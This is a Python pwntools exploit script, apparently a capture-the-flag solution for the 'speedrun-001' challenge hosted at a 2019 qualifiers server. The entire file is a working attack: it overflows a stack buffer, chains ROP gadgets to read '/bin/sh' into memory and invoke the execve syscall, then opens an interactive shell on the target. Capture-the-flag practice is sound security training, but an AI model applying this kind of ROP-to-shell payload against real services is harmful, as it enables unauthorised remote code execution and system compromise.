#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./speedrun-001')
else:
    s = remote('speedrun-001.quals2019.oooverflow.io', 31337)

elf = ELF('./speedrun-001')

pop_rax = 0x415664
pop_rdi = 0x400686
pop_rsi = 0x4101f3
pop_rdx = 0x44be16
syscall = 0x474e65
puts = 0x410390
read = 0x4498a0

payload = ''
payload += 'A' * 0x400
payload += 'A' * 8
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(elf.bss())
payload += p64(pop_rdx) + p64(0x100)
payload += p64(read)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdi) + p64(elf.bss())
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)

s.sendafter('words?\n', payload)
s.recvline()
s.send('/bin/sh\0')
s.interactive()
